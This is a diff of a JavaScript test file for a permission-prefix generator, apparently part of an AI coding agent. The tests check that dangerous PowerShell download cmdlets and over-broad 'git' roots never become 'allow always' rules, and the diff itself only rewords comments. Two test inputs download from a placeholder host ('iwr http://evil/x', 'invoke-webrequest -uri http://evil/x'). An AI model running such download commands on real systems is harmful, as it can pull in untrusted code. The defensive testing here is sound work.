@@ -51,7 +51,7 @@ test('subcommands sharing a root collapse via word-aligned LCP', () => {
 // degenerates to a bare SUBCOMMAND-AWARE root (`git fetch`+`git worktree add`
 // → `git`, `git add`+`git commit` → `git`) is now DROPPED rather than emitted.
 // Previously this returned ['git'], which would auto-allow `git push --force`.
-// Mirrors Claude's getCompoundCommandPrefixesStatic collapse guard
+// Mirrors the reference's getCompoundCommandPrefixesStatic collapse guard
 // (utils/powershell/staticPrefix.ts L271-280).
 test('bare subcommand-aware root collapse is dropped, not emitted', () => {
   assert.deepEqual(
@@ -81,7 +81,7 @@ test('compound command where every subcommand is excluded yields no rules', () =
 // tool-executor calls to seed "allow always" rules (one addRule per returned
 // prefix). A dangerous PowerShell cmdlet must yield NO prefix so no persistent
 // `invoke-webrequest*` / `foreach-object*` wildcard rule is ever created — the
-// invocation degrades to allow-once. Mirrors Claude's NEVER_SUGGEST gate.
+// invocation degrades to allow-once. Mirrors the reference's NEVER_SUGGEST gate.
 test('dangerous PowerShell cmdlets produce no allow-always prefix (NEVER_SUGGEST)', () => {
   assert.deepEqual(getCompoundCommandPrefixes('iwr http://evil/x -outfile y'), []);
   assert.deepEqual(getCompoundCommandPrefixes('invoke-webrequest -uri http://evil/x'), []);
